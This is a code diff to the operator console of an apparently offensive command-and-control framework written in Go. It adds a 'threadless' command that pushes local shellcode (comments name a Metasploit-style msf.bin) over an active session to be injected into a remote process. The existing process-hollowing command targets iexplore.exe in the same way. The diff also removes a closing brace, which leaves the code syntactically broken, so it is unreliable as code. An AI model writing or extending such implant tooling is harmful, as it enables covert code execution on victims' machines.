@@ -191,7 +191,6 @@ func openSession(id int, ll *SessionList) {
 			fmt.Println("[!]Connecting ...")
 			if !authSession(&current.Conn) {
 				return
-			}
 			fmt.Println("[+]BUSHIDO Shell Open ...\n")
 			reader := bufio.NewReader(os.Stdin)
 
@@ -211,6 +210,8 @@ func openSession(id int, ll *SessionList) {
 				cdMatch := cdRegex.FindString(command)
 				hollowRegex := regexp.MustCompile(`hollow .+ .+`)
 				hollowMatch := hollowRegex.FindString(command)
+				threadlessRegex := regexp.MustCompile(`threadless .+ .+`)
+				threadlessMatch := threadlessRegex.FindString(command)
 				if cdMatch != "" {
 					dir2go := strings.Split(command, " ")[1]
 					cd(&current.Conn, dir2go)
@@ -233,6 +234,17 @@ func openSession(id int, ll *SessionList) {
 					fmt.Println("[!]Local File Path: " + filePathLocal)
 					fmt.Println("[!]Remote File Path: " + filePathTarget)
 					hollow(&current.Conn, filePathLocal, filePathTarget) //hollow /home/hummus/Git/Dev/Go/Demolitron_C2/Bushido/msf.bin "C:\\Program Files\\Internet Explorer\\iexplore.exe"
+					fmt.Println()
+				}
+				if threadlessMatch != "" {
+					//Try it with //threadless Bushido/msf.bin notepad.exe
+					filePathLocal := strings.Split(command, " ")[1]
+					remoteProcess := strings.Split(command, " ")[2]
+					fmt.Println()
+					fmt.Println("[!]Local File Path: " + filePathLocal)
+					fmt.Println("[!]Remote File Path: " + remoteProcess)
+					threadless(&current.Conn, filePathLocal, remoteProcess)
+					fmt.Println()
 				}
 				switch command { //All of the functions called below will be found under bushido.go
 				case "shell":
@@ -268,6 +280,8 @@ func openSession(id int, ll *SessionList) {
 					ls(&current.Conn)
 				case "pwd":
 					pwd(&current.Conn)
+				case "threadless":
+					fmt.Println("\n[?]Usage: threadless <pathToShellcodeLocal> <RemoteProcessName>")
 				case "hollow":
 					fmt.Println("\n[?]Usage: hollow <pathToExeLocal> <\"path2ExeRemote\">")
 					fmt.Println("[?]Windows paths must have double backslashes as such: \"C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe\"\n")
